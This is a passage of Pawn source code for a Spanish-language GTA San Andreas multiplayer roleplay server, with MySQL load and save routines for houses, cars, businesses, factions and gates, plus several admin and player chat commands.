	maletero[i][mdrogas][4], i);
	mysql_query(servidor[mysqlControl], consulta, false);
	return 1;
}
CallBack::ActualizaAutoFacc(i)
{
	new consulta[256];
	format(consulta, sizeof(consulta), "UPDATE zz_autosfacc SET faccion=%d, col1=%d, col2=%d, posx=%f, posy=%f, posz=%f, posa=%f, modelo=%d WHERE idunico=%d", 
	Autosfacc[i][af@faccion], 
	Autosfacc[i][af@colores][0], 
	Autosfacc[i][af@colores][1], 
	Autosfacc[i][af@Pos][0], 
	Autosfacc[i][af@Pos][1], 
	Autosfacc[i][af@Pos][2], 
	Autosfacc[i][af@Pos][3], 
	Autosfacc[i][af@modelo], 
	Autosfacc[i][af@unico]);
	mysql_query(servidor[mysqlControl], consulta, false);
	return 1;
}
CallBack::ActualizaVehiculo(idx)
{
    new consulta[1024];
	format(consulta, sizeof(consulta), "UPDATE zz_coches SET modelo=%d, propietario='%s', nombre='%s', ocupado=%d, posicionx=%f, posiciony=%f, posicionz=%f, posiciona=%f, color1=%d, color2=%d, precio=%d, seguro=%d, bateria=%d, spoiler=%d, hood=%d, roof=%d, sideskirt=%d, nitrogeno=%d, lamps=%d, exhaust=%d, ruedas=%d, hidraulico=%d, paintjob=%d, frontbump=%d, rearbump=%d, vents=%d, embargo=%d, multa=%d, placa='%s', gasolina=%d, alarma=%d, tiempo=%d, gps=%d WHERE carid=%d", 
	autos[idx][cModel], 
	autos[idx][cOwner], 
	autos[idx][cName], 
	autos[idx][cOwned], 
	autos[idx][cLocationx], 
	autos[idx][cLocationy], 
	autos[idx][cLocationz], 
	autos[idx][cAngle], 
	autos[idx][cColorOne], 
	autos[idx][cColorTwo], 
	autos[idx][cValue], 
	autos[idx][cLock], 
	autos[idx][cBattery], 
	autos[idx][cSpoiler], 
	autos[idx][cHood], 
	autos[idx][cRoof], 
	autos[idx][cSideskirt], 
	autos[idx][cNitro], 
	autos[idx][cLamps], 
	autos[idx][cExhaust], 
	autos[idx][cWheel], 
	autos[idx][cHydraulics], 
	autos[idx][cPaintjob], 
	autos[idx][cFrontBumper], 
	autos[idx][cRearBumper], 
	autos[idx][cVents], 
	autos[idx][cEmbargo], 
	autos[idx][cMulta], 
	autos[idx][cPlate], 
	autos[idx][cGas], 
	autos[idx][cAlarm], 
	autos[idx][cVehTime], 
	autos[idx][cGPS], 
	autos[idx][cCarid]);
	mysql_query(servidor[mysqlControl], consulta, false);
	return 1;
}
CallBack::ActualizaCasa(idx)
{
	new consulta[1024];
	format(consulta, sizeof(consulta), "UPDATE zz_casas SET ocupado=%d, propietario='%s', ubicacion='%s', nombre='%s', entradax=%f, entraday=%f, entradaz=%f, salidax=%f, saliday=%f, salidaz=%f, interior=%d, nivel=%d, precio=%d, seguro=%d, cuartos=%d, renta=%d, rentabil=%d, arma=%d, municion=%d, materiales=%d, drogas=%d, speed=%d, ectasi=%d, ritalin=%d, heroina=%d, marihuana=%d, world=%d, tiempo=%d WHERE casaid=%d;", 
    casa[idx][hOwned], 
    casa[idx][hOwner], 
    casa[idx][hUbicacion], 
    casa[idx][hNombre], 
	casa[idx][hEntrancex], 
	casa[idx][hEntrancey], 
	casa[idx][hEntrancez], 
	casa[idx][hExitx], 
	casa[idx][hExity], 
	casa[idx][hExitz], 
	casa[idx][hInt], 
    casa[idx][hLevel], 
	casa[idx][hValue], 
	casa[idx][hLock], 
	casa[idx][hRooms], 
	casa[idx][hRent], 
	casa[idx][hRentabil], 
	casa[idx][hWep], 
	casa[idx][hAmmo], 
    casa[idx][hMats], 
    casa[idx][hDrugs], 
    casa[idx][hSpeed], 
    casa[idx][hEctasy], 
    casa[idx][hRitalin], 
    casa[idx][hHeroina], 
    casa[idx][hMarihuana], 
	casa[idx][hWorld], 
	casa[idx][hTime], 
	casa[idx][hHouseid]);
	mysql_query(servidor[mysqlControl], consulta, false);
	return 1;
}
CallBack::ActualizaNegocio(bizzid){
	new consulta[1024];
	format(consulta, sizeof(consulta), "UPDATE zz_negocios SET owned=%d, owner='%s', name='%s', extortion='%s', entrancex=%.4f, entrancey=%.4f, entrancez=%.4f, exitx=%.4f, exity=%.4f, exitz=%.4f, interior=%d, levelneeded=%d, buyprice=%d, till=%d, tillx=%d, productos=%d, costoentrada=%d, tiempo=%d, ubicacion='%s', empresa='%s' WHERE negocioid = %d;", 
	negocio[bizzid][bOwned], 
	negocio[bizzid][bOwner], 
	negocio[bizzid][bName], 
	negocio[bizzid][bExtortion], 
	negocio[bizzid][bEntrancex], 
	negocio[bizzid][bEntrancey], 
	negocio[bizzid][bEntrancez], 
	negocio[bizzid][bExitx], 
	negocio[bizzid][bExity], 
	negocio[bizzid][bExitz], 
	negocio[bizzid][bInt], 
	negocio[bizzid][bLevelNeeded], 
	negocio[bizzid][bBuyPrice], 
	negocio[bizzid][bTill], 
	negocio[bizzid][bTillEx], 
	negocio[bizzid][bProduc], 
	negocio[bizzid][bcostenter], 
	negocio[bizzid][bTime], 
	negocio[bizzid][bUbicacion], 
	negocio[bizzid][bEmpresa], 
	negocio[bizzid][bID]);
	mysql_query(servidor[mysqlControl], consulta, false);
	return 1;
}
CallBack::ActualizarReja(rejaid)
{
	new consulta[1024];
	format(consulta, sizeof(consulta), "UPDATE zz_rejas SET modelo=%d, cobra=%d, faccion=%d, aposx=%f, aposy=%f, aposz=%f, arotx=%f, aroty=%f, arotz=%f, cposx=%f, cposy=%f, cposz=%f, crotx=%f, croty=%f, crotz=%f WHERE unico=%d;", 
	rejas[rejaid][reModelo], 
	rejas[rejaid][reCobra], 
	rejas[rejaid][reFacion], 
	rejas[rejaid][rePos][0], 
	rejas[rejaid][rePos][1], 
	rejas[rejaid][rePos][2], 
	rejas[rejaid][rePos][3], 
	rejas[rejaid][rePos][4], 
	rejas[rejaid][rePos][5], 
	rejas[rejaid][rePos][6], 
	rejas[rejaid][rePos][7], 
	rejas[rejaid][rePos][8], 
	rejas[rejaid][rePos][9], 
	rejas[rejaid][rePos][10], 
	rejas[rejaid][rePos][11], 
	rejaid);
	mysql_query(servidor[mysqlControl], consulta, false);
	return 1;
}
CallBack::CargarRejas()
{
	new Cache:r = mysql_query(servidor[mysqlControl], "SELECT * FROM zz_rejas", true);
	for(new db=cache_get_row_count(), i=0; i<db; i++)
	{
		rejas[i][reModelo] = cache_get_row_int(i, 1, servidor[mysqlControl]);
		rejas[i][reCobra] = cache_get_row_int(i, 2, servidor[mysqlControl]);
		rejas[i][reFacion] = cache_get_row_int(i, 3, servidor[mysqlControl]);
		for(new x=0;x<12;x++)
		{
			rejas[i][rePos][x] = cache_get_row_float(i, 4+x, servidor[mysqlControl]);
		}
		if(rejas[i][reModelo])
		{
			rejas[i][reID] = CreateDynamicObject(rejas[i][reModelo], rejas[i][rePos][6], rejas[i][rePos][7], rejas[i][rePos][8], rejas[i][rePos][9], rejas[i][rePos][10], rejas[i][rePos][11]);
		}
	}
	cache_delete(r);
	return 1;
}
CallBack::Cargarfacciones()
{
	new Cache:f = mysql_query(servidor[mysqlControl], "SELECT * FROM zz_ilegalfacciones", true);
	for(new db=cache_get_row_count(), i=0; i<db; i++)
	{
		IFacciones[i][If@usada] = cache_get_row_int(i, 1, servidor[mysqlControl]);
		
		cache_get_row(i, 2, IFacciones[i][If@nombre], servidor[mysqlControl], 32);
		
		cache_get_row(i, 3, IFacciones[i][If@rango0], servidor[mysqlControl], 12);
		cache_get_row(i, 4, IFacciones[i][If@rango1], servidor[mysqlControl], 12);
		cache_get_row(i, 5, IFacciones[i][If@rango2], servidor[mysqlControl], 12);
		cache_get_row(i, 6, IFacciones[i][If@rango3], servidor[mysqlControl], 12);
		cache_get_row(i, 7, IFacciones[i][If@rango4], servidor[mysqlControl], 12);
		cache_get_row(i, 8, IFacciones[i][If@rango5], servidor[mysqlControl], 12);
		
		IFacciones[i][If@boveda] = cache_get_row_int(i, 9, servidor[mysqlControl]);
		
		for(new k=0; k<20; k++)
		{
			IFacciones[i][If@armas][k] = cache_get_row_int(i, 10+k, servidor[mysqlControl]);
			IFacciones[i][If@drogas][k] = cache_get_row_int(i, 30+k, servidor[mysqlControl]);
		}
		
		IFacciones[i][If@pos][0] = cache_get_row_float(i, 50, servidor[mysqlControl]);
		IFacciones[i][If@pos][1] = cache_get_row_float(i, 51, servidor[mysqlControl]);
		IFacciones[i][If@pos][2] = cache_get_row_float(i, 52, servidor[mysqlControl]);	
		
		IFacciones[i][If@bpos][0] = cache_get_row_float(i, 53, servidor[mysqlControl]);
		IFacciones[i][If@bpos][1] = cache_get_row_float(i, 54, servidor[mysqlControl]);
		IFacciones[i][If@bpos][2] = cache_get_row_float(i, 55, servidor[mysqlControl]);
		
		IFacciones[i][If@color] = cache_get_row_int(i, 56, servidor[mysqlControl]);
		
		if(IFacciones[i][If@usada])
		{
			new string[128];
			format(string, sizeof(string), "{B22222}Territorio de\n{FFFFFF}%s", IFacciones[i][If@nombre]);
			IFacciones[i][If@3dlabel] = CreateDynamic3DTextLabel(string, -1, IFacciones[i][If@pos][0], IFacciones[i][If@pos][1], IFacciones[i][If@pos][2]+0.75, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1);
			IFacciones[i][If@pick] = CreateDynamicPickup(1314, 1, IFacciones[i][If@pos][0], IFacciones[i][If@pos][1], IFacciones[i][If@pos][2], -1);
			IFacciones[i][If@gang] = GangZoneCreate(IFacciones[i][If@pos][0] - 60, IFacciones[i][If@pos][1] - 60, IFacciones[i][If@pos][0] + 60, IFacciones[i][If@pos][1] + 60);
			format(string, sizeof(string), "Boveda de {008000}%s\n{FFFFFF}Use {868FD9}/boveda", IFacciones[i][If@nombre]);
			IFacciones[i][If@b3dlabel] = CreateDynamic3DTextLabel(string, 0xFFFFFFFF, IFacciones[i][If@bpos][0], IFacciones[i][If@bpos][1], IFacciones[i][If@bpos][2], 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
			IFacciones[i][If@bpick] = CreateDynamicObject(2332, IFacciones[i][If@bpos][0], IFacciones[i][If@bpos][1], IFacciones[i][If@bpos][2] - 0.7, 0.0, 0.0, 0.0);
		}
	}
	cache_delete(f);
	return 1;
}
CallBack::Cargarfamilias()
{
	new Cache:f = mysql_query(servidor[mysqlControl], "SELECT * FROM zz_familias", true);
	for(new db=cache_get_row_count(), i=1; i<db; i++)
	{
		familias[i][fOcupado] = cache_get_row_int(i, 1, servidor[mysqlControl]);

		cache_get_row(i, 2, familias[i][fNombre], servidor[mysqlControl], 64);
		
		cache_get_row(i, 3, familias[i][fRango0], servidor[mysqlControl], 24);
		cache_get_row(i, 4, familias[i][fRango1], servidor[mysqlControl], 24);
		cache_get_row(i, 5, familias[i][fRango2], servidor[mysqlControl], 24);
		cache_get_row(i, 6, familias[i][fRango3], servidor[mysqlControl], 24);
		cache_get_row(i, 7, familias[i][fRango4], servidor[mysqlControl], 24);
		cache_get_row(i, 8, familias[i][fRango5], servidor[mysqlControl], 24);

		familias[i][fpospick][0] = cache_get_row_float(i, 9, servidor[mysqlControl]);
		familias[i][fpospick][1] = cache_get_row_float(i, 10, servidor[mysqlControl]);
		familias[i][fpospick][2] = cache_get_row_float(i, 11, servidor[mysqlControl]);
		
		if(familias[i][fOcupado])
		{
			new string[128];
			format(string, sizeof(string), "{B22222}Prodiedad de\n{FFFFFF}%s", familias[i][fNombre]);
			familias[i][fHqFam3d] = CreateDynamic3DTextLabel(string, -1, familias[i][fpospick][0], familias[i][fpospick][1], familias[i][fpospick][2]+0.75, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1);
			familias[i][fHqFampi] = CreateDynamicPickup(1314, 1, familias[i][fpospick][0], familias[i][fpospick][1], familias[i][fpospick][2], -1);
		}
	}
	cache_delete(f);
	return 1;
}
/*
	0  - 19: AmmoNation
	21 - 40: Tienda 24/7
	499: Discoteca Alhambra
	498: Clup VIP
	497: 10 Green Bottles
	496 - 492: Binco
	491 - 487: Tienda Victim
	486 - 482: BurguerShot
	481: Conse grotty
	480: conse medio
	479: conse moto
	478: Electronicos SOCIP
	477 - 473: Chukin Bell
	472: Gymnacio
	471: Casino 4 Dragones
	470: cafe el dorado
	469 - 465: Pizza Stack
*/
CallBack::CargarCasas(){
	new Cache:Resultado = mysql_query(servidor[mysqlControl], "SELECT * FROM zz_casas", true);
	for(new db=cache_get_row_count(), i=0; i < db; i++){
		casa[i][hHouseid]		= cache_get_row_int(i, 0, servidor[mysqlControl]);
		casa[i][hOwned]		= cache_get_row_int(i, 1, servidor[mysqlControl]);
		
		cache_get_row(i, 2, casa[i][hOwner], servidor[mysqlControl], 24);
		cache_get_row(i, 3, casa[i][hUbicacion], servidor[mysqlControl], 24);
		cache_get_row(i, 4, casa[i][hNombre], servidor[mysqlControl], 24);
		
		casa[i][hEntrancex]		= cache_get_row_float(i, 5, servidor[mysqlControl]);
		casa[i][hEntrancey]		= cache_get_row_float(i, 6, servidor[mysqlControl]);
		casa[i][hEntrancez]		= cache_get_row_float(i, 7, servidor[mysqlControl]);
		casa[i][hExitx]			= cache_get_row_float(i, 8, servidor[mysqlControl]);
		casa[i][hExity]			= cache_get_row_float(i, 9, servidor[mysqlControl]);
		casa[i][hExitz]			= cache_get_row_float(i, 10, servidor[mysqlControl]);

		casa[i][hInt]			= cache_get_row_int(i, 11, servidor[mysqlControl]);
		casa[i][hLevel]		= cache_get_row_int(i, 12, servidor[mysqlControl]);
		casa[i][hValue]		= cache_get_row_int(i, 13, servidor[mysqlControl]);
		casa[i][hLock]			= cache_get_row_int(i, 14, servidor[mysqlControl]);
		casa[i][hRooms]		= cache_get_row_int(i, 15, servidor[mysqlControl]);
		casa[i][hRent]			= cache_get_row_int(i, 16, servidor[mysqlControl]);
		casa[i][hRentabil]		= cache_get_row_int(i, 17, servidor[mysqlControl]);
		casa[i][hWep]			= cache_get_row_int(i, 18, servidor[mysqlControl]);
		casa[i][hAmmo]			= cache_get_row_int(i, 19, servidor[mysqlControl]);
		casa[i][hMats]			= cache_get_row_int(i, 20, servidor[mysqlControl]);
		casa[i][hDrugs]		= cache_get_row_int(i, 21, servidor[mysqlControl]);
		casa[i][hSpeed]		= cache_get_row_int(i, 22, servidor[mysqlControl]);
		casa[i][hEctasy]		= cache_get_row_int(i, 23, servidor[mysqlControl]);
		casa[i][hRitalin]		= cache_get_row_int(i, 24, servidor[mysqlControl]);
		casa[i][hHeroina]		= cache_get_row_int(i, 25, servidor[mysqlControl]);
		casa[i][hMarihuana]	= cache_get_row_int(i, 26, servidor[mysqlControl]);
		casa[i][hWorld]		= cache_get_row_int(i, 27, servidor[mysqlControl]);
		casa[i][hTime]			= cache_get_row_int(i, 28, servidor[mysqlControl]);
	}
	cache_delete(Resultado);
	return 1;
}
CallBack::CargarAutosFacc()
{
	new Cache:resultado = mysql_query(servidor[mysqlControl], "SELECT * FROM zz_autosfacc", true);
	for(new i=0; i<cache_get_row_count();i++)
	{
		Autosfacc[i][af@unico] = cache_get_row_int(i, 0, servidor[mysqlControl]);
		Autosfacc[i][af@faccion] = cache_get_row_int(i, 1, servidor[mysqlControl]);
		Autosfacc[i][af@colores][0] = cache_get_row_int(i, 2, servidor[mysqlControl]);
		Autosfacc[i][af@colores][1] = cache_get_row_int(i, 3, servidor[mysqlControl]);
		
		Autosfacc[i][af@Pos][0] = cache_get_row_float(i, 4, servidor[mysqlControl]);
		Autosfacc[i][af@Pos][1] = cache_get_row_float(i, 5, servidor[mysqlControl]);
		Autosfacc[i][af@Pos][2] = cache_get_row_float(i, 6, servidor[mysqlControl]);
		Autosfacc[i][af@Pos][3] = cache_get_row_float(i, 7, servidor[mysqlControl]);
		
		Autosfacc[i][af@modelo] = cache_get_row_int(i, 8, servidor[mysqlControl]);
		Autosfacc[i][af@carid] = AddStaticVehicleAnt(Autosfacc[i][af@modelo], Autosfacc[i][af@Pos][0], Autosfacc[i][af@Pos][1], Autosfacc[i][af@Pos][2]+1.0, Autosfacc[i][af@Pos][3], Autosfacc[i][af@colores][0], Autosfacc[i][af@colores][1], VEHICULO_SPAWN);
	}
	cache_delete(resultado);
	return 1;
}

CallBack::CargarAutos(){
	new Cache:Resultado = mysql_query(servidor[mysqlControl], "SELECT * FROM zz_coches", true);
	for(new db = cache_get_row_count(), i = 1; i < db; i++){
		autos[i][cCarid] = cache_get_row_int(i, 0, servidor[mysqlControl]);
		autos[i][cModel] = cache_get_row_int(i, 1, servidor[mysqlControl]);
			
		cache_get_row(i, 2, autos[i][cOwner], servidor[mysqlControl], 24);
		cache_get_row(i, 3, autos[i][cName], servidor[mysqlControl], 32);
		
		autos[i][cOwned] = cache_get_row_int(i, 4, servidor[mysqlControl]);
		
		autos[i][cLocationx] = cache_get_row_float(i, 5, servidor[mysqlControl]);
		autos[i][cLocationy] = cache_get_row_float(i, 6, servidor[mysqlControl]);
		autos[i][cLocationz] = cache_get_row_float(i, 7, servidor[mysqlControl]);
		autos[i][cAngle] = cache_get_row_float(i, 8, servidor[mysqlControl]);
		
		autos[i][cColorOne] = cache_get_row_int(i, 9, servidor[mysqlControl]);
		autos[i][cColorTwo] = cache_get_row_int(i, 10, servidor[mysqlControl]);
		autos[i][cValue] = cache_get_row_int(i, 11, servidor[mysqlControl]);
		autos[i][cLock] = cache_get_row_int(i, 12, servidor[mysqlControl]);
		autos[i][cBattery] = cache_get_row_int(i, 13, servidor[mysqlControl]);
		autos[i][cSpoiler] = cache_get_row_int(i, 14, servidor[mysqlControl]);
		autos[i][cHood] = cache_get_row_int(i, 15, servidor[mysqlControl]);
		autos[i][cRoof] = cache_get_row_int(i, 16, servidor[mysqlControl]);
		autos[i][cSideskirt] = cache_get_row_int(i, 17, servidor[mysqlControl]);
		autos[i][cNitro] = cache_get_row_int(i, 18, servidor[mysqlControl]);
		autos[i][cLamps] = cache_get_row_int(i, 19, servidor[mysqlControl]);
		autos[i][cExhaust] = cache_get_row_int(i, 20, servidor[mysqlControl]);
		autos[i][cWheel] = cache_get_row_int(i, 21, servidor[mysqlControl]);
		autos[i][cHydraulics] = cache_get_row_int(i, 22, servidor[mysqlControl]);
		autos[i][cPaintjob] = cache_get_row_int(i, 23, servidor[mysqlControl]);
		autos[i][cFrontBumper] = cache_get_row_int(i, 24, servidor[mysqlControl]);
		autos[i][cRearBumper] = cache_get_row_int(i, 25, servidor[mysqlControl]);
		autos[i][cVents] = cache_get_row_int(i, 26, servidor[mysqlControl]);
		autos[i][cEmbargo] = cache_get_row_int(i, 27, servidor[mysqlControl]);
		autos[i][cMulta] = cache_get_row_int(i, 28, servidor[mysqlControl]);
		
		cache_get_row(i, 29, autos[i][cPlate], servidor[mysqlControl], 16);
		
		autos[i][cGas] = cache_get_row_int(i, 30, servidor[mysqlControl]);
		autos[i][cAlarm] = cache_get_row_int(i, 31, servidor[mysqlControl]);
		autos[i][cVehTime] = cache_get_row_int(i, 32, servidor[mysqlControl]);
		autos[i][cGPS] = cache_get_row_int(i, 33, servidor[mysqlControl]); 
	}

	for(new i=1; i < VEHICULOS_COMPRABLES; i++){
		AddStaticVehicleAnt(autos[i][cModel], autos[i][cLocationx], autos[i][cLocationy], autos[i][cLocationz]+1.0, autos[i][cAngle], autos[i][cColorOne], autos[i][cColorTwo], VEHICULO_SPAWN);
		if(!EsBicicleta(i)){
			SetVehicleParamsEx(i, 0, 0, 0, autos[i][cLock], 0, 0, 0);
		}
	}
	cache_delete(Resultado);
	return 1;
}
CallBack::CargarMaletas()
{
	new Cache:Resultado = mysql_query(servidor[mysqlControl], "SELECT * FROM zz_maletas", true);
	for(new db = cache_get_row_count(), i=0; i < db; i++)
	{
		maletero[i][marma][0]		= cache_get_row_int(i, 1, servidor[mysqlControl]);
		maletero[i][marma][1]		= cache_get_row_int(i, 2, servidor[mysqlControl]);
		maletero[i][marma][2]		= cache_get_row_int(i, 3, servidor[mysqlControl]);
		maletero[i][marma][3]		= cache_get_row_int(i, 4, servidor[mysqlControl]);
		maletero[i][marma][4]		= cache_get_row_int(i, 5, servidor[mysqlControl]);
		maletero[i][marma][5]		= cache_get_row_int(i, 6, servidor[mysqlControl]);
		maletero[i][marma][6]		= cache_get_row_int(i, 7, servidor[mysqlControl]);
		maletero[i][marma][7]		= cache_get_row_int(i, 8, servidor[mysqlControl]);
		maletero[i][mchaleco]		= cache_get_row_int(i, 9, servidor[mysqlControl]);
		maletero[i][mdrogas][0]		= cache_get_row_int(i, 10, servidor[mysqlControl]);
		maletero[i][mdrogas][1]		= cache_get_row_int(i, 11, servidor[mysqlControl]);
		maletero[i][mdrogas][2]		= cache_get_row_int(i, 12, servidor[mysqlControl]);
		maletero[i][mdrogas][3]		= cache_get_row_int(i, 13, servidor[mysqlControl]);
		maletero[i][mdrogas][4]		= cache_get_row_int(i, 14, servidor[mysqlControl]);
		
		if(TieneMaleta(i))
		{
			for(new k=0;k<8;k++)
			{
				if(maletero[i][marma][k])
				{
					MaleteroObjetos[i][k] = CreateDynamicObject(GunObjects[maletero[i][marma][k]][0], 0, 0, -1000, 0, 0, 0);
					switch(k)
					{
						case 0: AttachDynamicObjectToVehicle(MaleteroObjetos[i][0], i, 0.300000, -1.950000, 0.075000, 94.499977, 43.200004, -221.399856);
						case 1: AttachDynamicObjectToVehicle(MaleteroObjetos[i][1], i, 0.449999, -2.100000, 0.075000, 94.499977, 43.200004, -221.399856);
						case 2: AttachDynamicObjectToVehicle(MaleteroObjetos[i][2], i, 0.000000, -2.100000, 0.075000, 94.499977, 43.200004, -221.399856);
						case 3: AttachDynamicObjectToVehicle(MaleteroObjetos[i][3], i, -0.075000, -2.325000, 0.075000, 94.499977, 43.200004, -221.399856);
						case 4: AttachDynamicObjectToVehicle(MaleteroObjetos[i][4], i, 0.524999, -2.325000, 0.075000, 94.499977, 43.200004, -221.399856);
						case 5: AttachDynamicObjectToVehicle(MaleteroObjetos[i][5], i, 0.375000, -2.325000, 0.150000, 94.499977, 43.200004, -221.399856);
						case 6: AttachDynamicObjectToVehicle(MaleteroObjetos[i][6], i, -0.075000, -2.325000, 0.150000, 94.499977, 43.200004, -221.399856);
						case 7: AttachDynamicObjectToVehicle(MaleteroObjetos[i][7], i, 0.150000, -2.100000, 0.150000, 94.499977, 43.200004, -221.399856);
					}
				}
			}
		}
	}
	cache_delete(Resultado);
	return 1;
}
CallBack::CargarNegocios()
{
	new Cache:Resultado = mysql_query(servidor[mysqlControl], "SELECT * FROM zz_negocios", true);
	for(new db = cache_get_row_count(), i=0; i<db; i++)
	{
		negocio[i][bID] = cache_get_row_int(i, 0, servidor[mysqlControl]);
		negocio[i][bOwned] = cache_get_row_int(i, 1, servidor[mysqlControl]);
		
		cache_get_row(i, 2, negocio[i][bOwner], servidor[mysqlControl], 24);
		cache_get_row(i, 3, negocio[i][bName], servidor[mysqlControl], 32);
		cache_get_row(i, 4, negocio[i][bExtortion], servidor[mysqlControl], 24);
		
		negocio[i][bEntrancex] = cache_get_row_float(i, 5, servidor[mysqlControl]);
		negocio[i][bEntrancey] = cache_get_row_float(i, 6, servidor[mysqlControl]);
		negocio[i][bEntrancez] = cache_get_row_float(i, 7, servidor[mysqlControl]);
		negocio[i][bExitx] = cache_get_row_float(i, 8, servidor[mysqlControl]);
		negocio[i][bExity] = cache_get_row_float(i, 9, servidor[mysqlControl]);
		negocio[i][bExitz] = cache_get_row_float(i, 10, servidor[mysqlControl]);
		
		negocio[i][bInt]=cache_get_row_int(i, 11, servidor[mysqlControl]);
		negocio[i][bLevelNeeded]=cache_get_row_int(i, 12, servidor[mysqlControl]);
		negocio[i][bBuyPrice]=cache_get_row_int(i, 13, servidor[mysqlControl]);
		negocio[i][bTill]=cache_get_row_int(i, 14, servidor[mysqlControl]);
		negocio[i][bTillEx]=cache_get_row_int(i, 15, servidor[mysqlControl]);
		negocio[i][bProduc]=cache_get_row_int(i, 16, servidor[mysqlControl]);
		negocio[i][bcostenter]=cache_get_row_int(i, 17, servidor[mysqlControl]);
		negocio[i][bTime]=cache_get_row_int(i, 18, servidor[mysqlControl]);
		
		cache_get_row(i, 19, negocio[i][bUbicacion], servidor[mysqlControl], 24);
		cache_get_row(i, 20, negocio[i][bEmpresa], servidor[mysqlControl], 24);
	}
	cache_delete(Resultado);
	return 1;
}
/******************************************************************************/
/***************************[- Comandos en ZCMD -]*****************************/
/***************************[- Hechos por Parka -]*****************************/
/******************************************************************************/
COMMAND:a(playerid, params[])
{
	if(cuenta[playerid][cAdministrador])
	{
		if(noac && cuenta[playerid][cAdministrador] < 2013)return Mensaje(playerid, COLOR_GRIS2, "Este canal está desactivado!");
		new string[256], mensaje[128], rango[32];
		if(sscanf(params, "s[128]", mensaje))return Mensaje(playerid, COLOR_GRIS2, "Utiliza /a [Mensaje]");
		
		switch(cuenta[playerid][cAdministrador])
		{
			case 1: rango = "{FFD700}Ayudante";
			case 2: rango = "{00A5F4}Moderador";
			case 3: rango = "{00A5F4}Admin Junior";
			case 4: rango = "{00A5F4}Administrador";
			case 5: rango = "{00A5F4}Admin Superior";
			case 6: rango = "{00A5F4}Admin Lider";
			case 2012: rango = "{EA7A0B}Enc de Facciones";
			case 2013: rango = "{EA7A0B}Enc de Staff";
			case 2014: rango = "{AA3333}Dueño";
		}
		format(string, sizeof(string), "%s %s:{ffffff} %s", rango, PlayerName(playerid), mensaje);
		MensajeAdmin(-1, string, 1);
	}
	return 1;
}

COMMAND:crearreja(playerid, params[])
{
	if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	new id, model, facion, precio;
	if(sscanf(params, "dddd", id, model, facion, precio))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /crearreja [ID][Modelo][Facion][Precio]");
	
	if(id < 0 || id > 49)return Mensaje(playerid, COLOR_GRIS2, "Error de Id solo del 0 al 49.");
	if(rejas[id][reID])return Mensaje(playerid, COLOR_GRIS2, "Reja en uso usar /eliminarreja o /editarreja");
	
	new Float:ipos[3];
	GetPlayerPos(playerid, ipos[0], ipos[1], ipos[2]);
	GetXYZInFrontOfPlayer(playerid, ipos[0], ipos[1], ipos[2], 3.0);
	
	rejas[id][reModelo] = model;
	rejas[id][reCobra] = precio;
	rejas[id][reFacion] = facion;
	
	rejas[id][rePos][6] = ipos[0];
	rejas[id][rePos][7] = ipos[1];
	rejas[id][rePos][8] = ipos[2];
	
	rejas[id][reID] = CreateDynamicObject(rejas[id][reModelo], rejas[id][rePos][6], rejas[id][rePos][7], rejas[id][rePos][8], rejas[id][rePos][9], rejas[id][rePos][10], rejas[id][rePos][11]);
	
	Mensaje(playerid, COLOR_ROJO, "Reja creada por favor moverse y usar /editarreja");
	return 1;
}
COMMAND:eliminarreja(playerid, params[])
{
	if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	new id;
	if(sscanf(params, "d", id))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /eliminarreja [ID]");
	if(id < 0 || id > sizeof(rejas)-1)return Mensaje(playerid, COLOR_GRIS2, "reja erronea 0 a 49.");
	
	rejas[id][reModelo] = 0;
	rejas[id][reCobra] = 0;
	rejas[id][reFacion] = 0;
	for(new i=0;i<12;i++) rejas[id][rePos][i] = 0.0;
	rejas[id][reEstado] = 0;
	
	DestroyDynamicObject(rejas[id][reID]);
	ActualizarReja(id);
	Mensaje(playerid, COLOR_VERDE, "Reja eliminada!");
	return 1;
}
COMMAND:editarreja(playerid, params[])
{
	if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(enteroChar[rejaPasos]{playerid} != REJA_EDITOR_PASO_A)return Mensaje(playerid, COLOR_GRIS2, "Usted ya esta editando una reja.");
	for(new x=0;x<sizeof(rejas);x++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 5.0, rejas[x][rePos][6], rejas[x][rePos][7], rejas[x][rePos][8]))
		{
			EditDynamicObject(playerid, rejas[x][reID]);
			enteroChar[rejaID]{playerid} = x;
			enteroChar[rejaPasos]{playerid} = REJA_EDITOR_PASO_B;
			Mensaje(playerid, COLOR_VERDE, "Por favor, colocar la posicion de la reja CERRADA.");
			return 1;
		}
	}
	Mensaje(playerid, COLOR_ROJO, "No estas cerca de una reja.");
	return 1;
}
COMMAND:guardarcuenta(playerid, params[])
{
	if(booleano[gIngreso]{playerid})
	{
		GuardarDatosMySQL(playerid);
		if(cuenta[playerid][cCasa] != 9999)
		{
			ActualizaCasa(cuenta[playerid][cCasa]);
		}		
		if(cuenta[playerid][cCasa2] != 9999)
		{
			ActualizaCasa(cuenta[playerid][cCasa2]);
		}
		if(cuenta[playerid][cNegocio] != 9999)
		{
			ActualizaNegocio(cuenta[playerid][cNegocio]);
		}
		if(cuenta[playerid][cNegocio2] != 9999)
		{
			ActualizaNegocio(cuenta[playerid][cNegocio2]);
		}
		if(cuenta[playerid][cCoche])
		{
			ActualizaVehiculo(cuenta[playerid][cCoche]);
		}
		if(cuenta[playerid][cCoche2])
		{
			ActualizaVehiculo(cuenta[playerid][cCoche2]);
		}
		if(cuenta[playerid][cCoche3])
		{
			ActualizaVehiculo(cuenta[playerid][cCoche3]);
		}
		if(cuenta[playerid][cCoche4])
		{
			ActualizaVehiculo(cuenta[playerid][cCoche4]);
		}
		Mensaje(playerid, COLOR_VERDE, "Sus datos fueron guardados exitosamente.");
	}
	return 1;
}

COMMAND:comandovip(playerid, params[])
{
    if(cuenta[playerid][cDinero] < 501)return Mensaje(playerid, COLOR_ROJO, "Para usar este comando necesita 501$ en mano!");
	cuenta[playerid][cDinero] -= 501;
	Mensaje(playerid, COLOR_AMARILLO2, "Se le han descontado 501$, disfrute de sus funciones VIP");
